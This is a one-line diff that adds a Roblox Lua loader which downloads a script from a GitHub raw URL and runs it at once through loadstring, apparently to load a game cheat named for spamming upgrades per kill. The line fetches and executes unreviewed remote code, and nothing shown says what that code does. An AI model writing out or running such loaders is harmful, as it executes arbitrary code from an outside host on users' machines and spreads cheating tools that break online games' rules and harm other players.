@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/1-upgrade-per-kill-spam7-s78xh71ioczzpq.lua"))()
